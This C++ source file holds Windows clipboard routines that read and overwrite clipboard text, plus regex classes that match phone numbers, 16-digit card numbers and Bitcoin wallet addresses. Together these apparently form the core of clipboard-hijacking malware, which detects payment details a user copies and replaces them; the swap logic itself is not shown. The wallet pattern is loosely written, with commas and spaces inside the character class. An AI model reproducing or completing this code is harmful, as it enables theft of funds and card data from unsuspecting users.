#include "Clipboard.h"

std::wstring GetClipboardText() {
  if (!OpenClipboard(nullptr)) {
    CloseClipboard();
    return L"";
  }

  HANDLE hData = GetClipboardData(CF_UNICODETEXT);
  if (hData == nullptr) {
    CloseClipboard();
    return L"";
  }

  wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
  if (pszText == nullptr) {
    CloseClipboard();
    return L"";
  }

  std::wstring text(pszText);

  GlobalUnlock(hData);
  CloseClipboard();

  return text;
}

ClipboardPhoneNumber::ClipboardPhoneNumber() {
  phone_number = std::make_shared<std::regex>("[0-9]{10}");
}

ClipboardCardNumber::ClipboardCardNumber() {
  card_number = std::make_shared<std::regex>("[0-9]{16}");
}

ClipboardBitcoin::ClipboardBitcoin() {
  bitcoin_wallet = std::make_shared<std::regex>("[a-z, A-Z, 0-9]{25}");
}

void SetToClipboard(std::string user, HGLOBAL hgBuffer,
                                          char* chBuffer) {
  if (OpenClipboard(nullptr)) {
    EmptyClipboard();
    hgBuffer =
        GlobalAlloc(GMEM_DDESHARE, user.length() + 1);
    chBuffer = (char*)GlobalLock(hgBuffer);
    strcpy(chBuffer, LPCSTR(user.c_str()));
    GlobalUnlock(hgBuffer);
    SetClipboardData(CF_TEXT, hgBuffer);
    CloseClipboard();
  }
}

std::shared_ptr<std::regex> ClipboardPhoneNumber::getRegex() const {
  return phone_number;
}

std::shared_ptr<std::regex> ClipboardCardNumber::getRegex() const {
  return card_number;
}

std::shared_ptr<std::regex> ClipboardBitcoin::getRegex() const {
  return bitcoin_wallet;
}